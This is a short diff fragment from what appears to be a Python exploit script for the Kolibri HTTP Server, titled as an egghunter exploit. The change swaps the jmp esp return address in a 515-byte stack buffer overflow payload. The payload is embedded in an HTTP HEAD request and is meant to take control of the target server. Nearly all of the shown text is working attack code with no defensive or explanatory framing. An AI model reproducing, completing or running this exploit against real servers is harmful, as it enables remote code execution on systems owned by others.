@@ -13,7 +13,9 @@ Kolibri HTTP Server Exploit - Egghunter
 print banner
 
 #jmp esp added from 0x77c35459 from msvcrt.dll
-Stage1 = "A"*515 + "\x59\x54\xC3\x77" + "B"*4
+#Stage1 = "A"*515 + "\x59\x54\xC3\x77" + "B"*4
+#0x7c9d30d7 jmp esp from shell32.dll?
+Stage1 = "A"*515 + "\xd7\x30\x9d\x7c" + "B"*4
 
 buffer = (
 "HEAD /" + Stage1 + " HTTP/1.1\r\n"
